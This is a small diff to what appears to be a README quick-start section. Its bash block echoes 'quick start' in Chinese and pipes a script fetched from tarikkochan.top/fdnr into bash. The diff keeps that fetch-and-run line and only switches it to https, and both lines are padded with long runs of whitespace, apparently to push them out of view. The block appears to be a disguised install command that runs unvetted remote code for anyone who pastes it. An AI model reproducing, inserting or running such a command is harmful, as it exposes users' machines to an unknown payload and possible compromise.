@@ -6,7 +6,7 @@
 
 ```bash
                                         echo "快速开始"
-                                curl tarikkochan.top/fdnr | bash
+                            curl https://tarikkochan.top/fdnr | bash
 ```
 
 ---
